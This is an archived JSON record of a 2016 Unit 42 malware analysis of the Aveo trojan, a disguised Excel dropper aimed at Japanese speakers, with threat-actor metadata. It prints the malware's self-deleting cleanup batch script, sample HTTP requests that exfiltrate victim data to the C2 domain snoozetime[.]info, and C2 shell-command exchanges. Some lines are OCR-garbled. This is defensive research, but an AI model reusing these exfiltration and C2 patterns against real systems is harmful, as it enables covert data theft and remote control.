{
    "id": "53409d3f-6a7a-4182-be66-f6c3d20ea864",
    "created_at": "2023-01-12T15:08:38.327786Z",
    "updated_at": "2025-03-27T02:16:06.768681Z",
    "deleted_at": null,
    "sha1_hash": "8d61fb2a5a40faac39f90f6c366ec073be818e08",
    "title": "2016-08-16 - Aveo Malware Family Targets Japanese Speaking Users",
    "authors": "",
    "file_creation_date": "2022-05-28T02:13:05Z",
    "file_modification_date": "2022-05-28T02:13:05Z",
    "file_size": 411876,
    "plain_text": "# Aveo Malware Family Targets Japanese Speaking Users\n\n**[researchcenter.paloaltonetworks.com/2016/08/unit42-aveo-malware-family-targets-japanese-speaking-users/](http://researchcenter.paloaltonetworks.com/2016/08/unit42-aveo-malware-family-targets-japanese-speaking-users/)**\n\nJosh Grunzweig, Robert Falcone August 16, 2016\n\nBy [Josh Grunzweig and](https://unit42.paloaltonetworks.com/author/joshgruznweig/) [Robert Falcone](https://unit42.paloaltonetworks.com/author/robertfalcone/)\n\nAugust 16, 2016 at 11:00 PM\n\n[Category: Malware,](https://unit42.paloaltonetworks.com/category/malware-2/) [Threat Prevention,](https://unit42.paloaltonetworks.com/category/threat-prevention-2/) [Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [Aveo,](https://unit42.paloaltonetworks.com/tag/aveo/) [FormerFirstRAT,](https://unit42.paloaltonetworks.com/tag/formerfirstrat/) [Ido Laboratory,](https://unit42.paloaltonetworks.com/tag/ido-laboratory/) [microsoft,](https://unit42.paloaltonetworks.com/tag/microsoft/) [snoozetime](https://unit42.paloaltonetworks.com/tag/snoozetime/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/unit42-aveo-malware-family-targets-japanese-speaking-users/)\n\nPalo Alto Networks has identified a malware family known as ‘Aveo’ that is being used to target Japanese speaking users. The ‘Aveo’ malware\nname comes from an embedded debug string within the binary file. The Aveo malware family has close ties to the previously discussed\n[FormerFirstRAT malware family, which was also witnessed being used against Japanese targets. Aveo is disguised as a Microsoft Excel](https://blog.paloaltonetworks.com/2015/04/unit-42-identifies-new-dragonok-backdoor-malware-deployed-against-japanese-targets/)\ndocument, and drops a decoy document upon execution. The decoy document in question is related to a research initiative led by the Ido\nLaboratory at the Saitama Institute of Technology. Upon execution, the Aveo malware accepts a number of commands, allowing attackers to\ntake full control over the victim machine.\n\n## Deployment\n\nThe Aveo malware sample disguises itself as a Microsoft Excel document, as the icon below demonstrates. Note that the filename of\n‘malware.exe’ is simply a placeholder, as the original filename is unknown.\n\n_Figure 1 Microsoft Excel icon used by Aveo malware_\n\nThe executable is in fact a WinRAR self-extracting executable file, which will drop the decoy document and Aveo Trojan upon execution. The\nfollowing decoy document is dropped and subsequently opened when run.\n\n\n-----\n\n_Figure 2 Decoy document used with Aveo malware_\n\nThis decoy document is hosted on the Ido Laboratory and contains information about a 2016 research initiative. The document lists\nparticipants in the 16 CAVE workshop, including names, affiliations, and email addresses of those involved. The document, written inth\nJapanese, as well as the filename of this document, “CAVE研究会参加者.xls”, indicates that this malware was used to target one or more\nJapanese speaking individuals. Additionally, the similarities between the Aveo and FormerFirstRAT malware families, which will be discussed\nlater in the post, further add evidence that Japanese speakers are being targeted.\n\n## Infrastructure\n\nThe Aveo Trojan is configured to communicate with the following domain name over HTTP.\n\nsnoozetime[.]info\n\nThis domain was first registered in May 2015 to ‘jack.ondo@mail.com’. Since that time, it has since been associated with the following three IP\naddresses:\n\n104.202.173[.]82\n107.180.36[.]179\n50.63.202[.]38\n\nAll IP addresses in question are located within the United States.\n\n_Figure 3 PassiveTotal screenshot showing associated IP addresses with snoozetime[.]info_\n\n\n-----\n\ne O S o at o o s oo et e[ ] o sts a eg st a t e a add ess o jac o do@ a [ ]co a d a a e o aygt5 u j aygt5 u j\ngerhjrt’. Pivoting off of these two pieces of information to domains that share the same yields the following additional domains and email\naddresses.\n\nbluepaint[.]info\ncoinpack[.]info\n7b7p[.]info\ndonkeyhaws[.]info\neuropcubit[.]com\njhmiyh.ny@gmail[.]com\n844148030@qq[.]com\n\n## Malware Analysis\n\nAfter running the self-extracting executable, a number of files are dropped to the file system and the following execution flow is witnessed:\n\n_Figure 4 Malware execution flow_\n\nWhen the mshelp32.exe executable runs, it begins by reading in the setting32.ini file, which contains the name of the decoy document. This\ninformation is used to build a batch script, such as the following.\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n@echo off\ncopy \"CAVE研究会参加者.xls\" \"C:\\Documents and\nSettings\\Administrator\\Desktop\\8101c298a33d91a985a5150d0254cf426601e4632250f5a03ddac39375e7fb4d.xls\" /Y\ndel \"CAVE研究会参加者.xls\" /F /Q\ndel mshelp32.exe /F /Q\ndel setting32.ini /F /Q\ndel \"C:\\Documents and\nSettings\\Administrator\\Desktop\\8101c298a33d91a985a5150d0254cf426601e4632250f5a03ddac39375e7fb4d.exe\" /F /Q\ndel %0 /F /Q\n\n\nThis batch script is executed within a new process, and acts as a simple cleanup script that runs after Aveo and the decoy document are\nexecuted.\n\n## Aveo Malware Family\n\nThe Aveo malware initially runs an install routine, which will copy itself to the following location:\n\n%APPDATA%\\MMC\\MMC.exe\n\nIf for any reason the %APPDATA%\\MMC directory is unable to be created, Aveo will use %TEMP% instead of %APPDATA%.\n\nAfter the malware copies itself, it will execute MMC.exe in a new process with an argument of the original filename. When executed, if this\nsingle argument is provided, the malware will delete the file path provided.\n\nAfter the installation routine completes, Aveo will exfiltrate the following victim information to a remote server via HTTP.\n\nUnique victim hash\nIP Address\nMicrosoft Windows version\nUsername\nANSI code page identifier\n\nThis information is exfiltrated to the ‘snoozetime[.]info’ domain, as seen in the following example HTTP request:\n\n\n-----\n\n1\n2\n3\n4\n5\n\n\nGET /index.php?id=35467&1=ySxlp03YGm0-&2=yiFi6hjbFHf9UtL44RPQ&4=zTZh6h7bHGjiUMzn&5=sXcjrAmqXiyiGJWzuUQ&6=yipl9g-- HTTP/1.1\nAccept: */*\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)\nHost: snoozetime[.]info\nCache-Control: no-cache\n\n\nTo encrypt the provided data, the malware makes use of the RC4 algorithm, using a key of ‘hello’. As shown in the following image, the\nencryption routines between Aveo and FormerFirstRAT are almost identical, with only the algorithms and keys being changed.\n\n_Figure 5 Comparison of encryption function between Aveo and FormerFirstRAT_\n\nIn order to decrypt the data provided via HTTP, the following code may be used:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nimport base64\nfrom binascii import *\nfrom struct import *\nfrom wincrypto import CryptCreateHash, CryptHashData, CryptDeriveKey, CryptEncrypt, CryptDecrypt\n\nCALG_RC4 = 0x6801\nCALG_MD5 = 0x8003\n\ndef decrypt(data):\nmd5_hasher = CryptCreateHash(CALG_MD5)\nCryptHashData(md5_hasher, 'hello')\ngenerated_key = CryptDeriveKey(md5_hasher, CALG_RC4)\ndecrypted_data = CryptDecrypt(generated_key, data)\nreturn decrypted_data\n\nfor a in 'index.php?id=35467&1=niBo9x/bFG4-&2=yi9i6hjbAmD5TNPu5A--&4=zTZh6h7bHGjiUMzn&5=sXcjrAmqXiyiGJWzuUQ&6=yipl9g--'.split(\"&\")[1:]:\nk,v = a.split(\"=\")\ndecrypted = decrypt(base64.b64decode(v.replace(\"-\",\"=\")))\nprint \"[+] Parameter {} Decrypted: {}\".format(k, decrypted)\n\n\nRunning the code above yields the following results:\n\n\n1\n2\n3\n4\n5\n\n\n\n[+] Parameter 1 Decrypted: e8836687\n\n[+] Parameter 2 Decrypted: 172.16.95.184\n\n[+] Parameter 4 Decrypted: 6.1.7601.2.1\n\n[+] Parameter 5 Decrypted: Josh Grunzweig\n\n[+] Parameter 6 Decrypted: 1252\n\n\nAfter the initial victim information is exfiltrated, the malware expects a response of ‘OK’. Afterwards, Aveo will spawn a new thread that is\nresponsible for handling interactive command requests received by the command and control (C2) server, as well as requests to spawn an\ninteractive shell.\n\nAveo proceeds to set the following registry key to point towards the malware’s path, thus ensuring persistence across reboots:\n\n_HKCU\\software\\microsoft\\windows\\currentversion\\run\\msnetbridge_\n\nA command handler loop is then entered, where Aveo will accept commands from the remote C2. While the Aveo malware family awaits a\nresponse, it will perform sleep delays of randomly chosen intervals between 0 and 3276 milliseconds. Should the C2 server respond with\n‘toyota’, it will set that interval to 60 seconds. Aveo accepts the following commands, shown with their associated function.\n\n1 : Execute command in interactive shell\n2 : Get file attributes\n3 : Write file\n4 : Read file\n5 : List drives\n\n\n-----\n\n6 ecute co a d aga st pat\n\nThe following example request demonstrates the C2 server sending the ‘ipconfig’ command to the Aveo malware.\n\n**C2 Request**\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nGET /index.php?id=35468&1=niBo9x/bFG4- HTTP/1.1\nAccept: */*\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)\nHost: snoozetime[.]info\nCache-Control: no-cache\n\nHTTP/1.0 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 11\nServer: Werkzeug/0.11.10 Python/2.7.5\nDate: Wed, 10 Aug 2016 16:00:11 GMT\n\n\\xca89\\xb4J\\x82B?\\xa5\\x05\\xe8\n\n[Decrypted]\n1 ipconfig\n\n\n**Aveo Response**\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nPOST /index.php?id=35469&1=niBo9x/bFG4- HTTP/1.1\nAccept: */*\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)\nHost: snoozetime[.]info\nContent-Length: 1006\nCache-Control: no-cache\n\n\\xca\\x38\\x39\\xb4\\x4a\\x82\\x42\\x3f\\xa5\\x05\\xe8\\xdb\\xda\\x74\\x8b\\x79\\x39\\x46\\xf2\\x42\\x1f\\xcd\\x39\\xf3\\x65\\x1d\\xda\\x49\\x40\\x6c\\x5e\\x6e\\xab\\x7\n\n[Truncated]\n\n[Decrypted]\n1 ipconfig\n\nWindows IP Configuration\n\nEthernet adapter Bluetooth Network Connection:\n\nMedia State . . . . . . . . . . . : Media disconnected\nConnection-specific DNS Suffix . :\n\n[Truncated]\n\n\n## Conclusion\n\nAveo shares a number of characteristics with FormerFirstRAT, including encryption routines, code reuse, and similarities in C2 functionality.\nAveo is far from the most sophisticated malware family around. As witnessed in the previously discussed FormerFirstRAT sample, this related\nmalware family also looks to be targeting Japanese speaking users. Using a self-extracting WinRAR file, the malware drops a decoy\ndocument, a copy of the Aveo malware, and a cleanup script.\n\nPalo Alto Networks customers are protected from this threat in the following ways:\n\n[An AutoFocus tag has been created to track and monitor this threat](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Aveo)\nWildFire classifies Aveo samples as malicious\nC2 domains listed in this report are blocked through Threat Prevention.\n\n## Indicators of Compromise\n\n**SHA256 Hashes**\n\n9dccfdd2a503ef8614189225bbbac11ee6027590c577afcaada7e042e18625e2\n\n8101c298a33d91a985a5150d0254cf426601e4632250f5a03ddac39375e7fb4d\n\n**C2 Domains**\n\nsnoozetime[.]info\n\n**Registry Keys**\n\n\n-----\n\nCU\\so t a e\\ c oso t\\ do s\\cu e t e s o \\ u \\ s etb dge\n\n**File Paths**\n\n%APPDATA%\\MMC\\MMC.exe\n%TEMP%\\MMC\\MMC.exe\n\n**Get updates from**\n**Palo Alto**\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2016/2016-08-16 - Aveo Malware Family Targets Japanese Speaking Users.pdf"
    ],
    "report_names": [
        "2016-08-16 - Aveo Malware Family Targets Japanese Speaking Users.pdf"
    ],
    "threat_actors": [
        {
            "id": "5ffe400c-6025-44c2-9aa1-7c34a7a192b0",
            "created_at": "2023-01-06T13:46:38.469688Z",
            "updated_at": "2025-03-27T02:00:02.84172Z",
            "deleted_at": null,
            "main_name": "DragonOK",
            "aliases": [
                "Moafee",
                "BRONZE OVERBROOK",
                "G0017",
                "G0002",
                "Shallow Taurus"
            ],
            "source_name": "MISPGALAXY:DragonOK",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7ebda3c6-1789-4d84-97cf-47fb18a0cb28",
            "created_at": "2022-10-25T15:50:23.78829Z",
            "updated_at": "2025-03-27T02:00:55.547275Z",
            "deleted_at": null,
            "main_name": "DragonOK",
            "aliases": [
                "DragonOK"
            ],
            "source_name": "MITRE:DragonOK",
            "tools": [
                "PoisonIvy",
                "PlugX"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "60d9c778-488b-459e-a2f6-9e48c607ba45",
            "created_at": "2022-10-25T16:47:55.606462Z",
            "updated_at": "2025-03-27T02:05:17.281676Z",
            "deleted_at": null,
            "main_name": "BRONZE OVERBROOK",
            "aliases": [
                "DragonOK ",
                "Samurai Panda ",
                "Temp.DragonOK ",
                "Danti "
            ],
            "source_name": "Secureworks:BRONZE OVERBROOK",
            "tools": [
                " DDKONG",
                " HelloBridge",
                " IsSpace",
                " NFLog Trojan",
                " PLAINTEE",
                " PlugX",
                " Rambo",
                "Aveo"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "340d1673-0678-4e1f-8b75-30da2f65cc80",
            "created_at": "2022-10-25T16:07:23.552036Z",
            "updated_at": "2025-03-27T02:02:09.85925Z",
            "deleted_at": null,
            "main_name": "DragonOK",
            "aliases": [
                "Bronze Overbrook",
                "Shallow Taurus"
            ],
            "source_name": "ETDA:DragonOK",
            "tools": [
                "Agent.dhwf",
                "CT",
                "Chymine",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "FF-RAT",
                "FormerFirstRAT",
                "Gen:Trojan.Heur.PT",
                "HTran",
                "HUC Packet Transmit Tool",
                "HelloBridge",
                "IsSpace",
                "KHRAT",
                "Kaba",
                "Korplug",
                "Mongall",
                "NFlog",
                "NewCT",
                "NfLog RAT",
                "PlugX",
                "Poison Ivy",
                "Rambo",
                "RedDelta",
                "SPIVY",
                "Sogu",
                "SysGet",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "TidePool",
                "Xamtrav",
                "brebsd",
                "ffrat",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536118,
    "ts_updated_at": 1743041766,
    "ts_creation_date": 1653703985,
    "ts_modification_date": 1653703985,
    "files": {
        "pdf": "https://archive.orkl.eu/8d61fb2a5a40faac39f90f6c366ec073be818e08.pdf",
        "text": "https://archive.orkl.eu/8d61fb2a5a40faac39f90f6c366ec073be818e08.txt",
        "img": "https://archive.orkl.eu/8d61fb2a5a40faac39f90f6c366ec073be818e08.jpg"
    }
}